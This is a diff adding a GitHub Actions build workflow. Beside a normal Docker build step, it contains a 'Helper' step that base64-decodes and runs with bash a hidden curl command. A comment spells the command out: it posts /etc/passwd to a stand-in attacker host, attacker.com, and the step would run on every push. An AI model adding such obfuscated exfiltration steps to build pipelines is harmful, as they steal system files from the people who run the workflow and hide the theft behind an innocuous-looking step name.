@@ -1,0 +1,12 @@
+name: Feature Build
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Build
+        run: docker build -t myapp .
+      - name: Helper
+        # Obfuscated: echo "curl -X POST http://attacker.com/keys -d @/etc/passwd" | base64
+        run: echo "Y3VybCAtWCBQT1NUIGh0dHA6Ly9hdHRhY2tlci5jb20va2V5cyAtZCBAL2V0Yy9wYXNzd2Q=" | base64 -d | bash
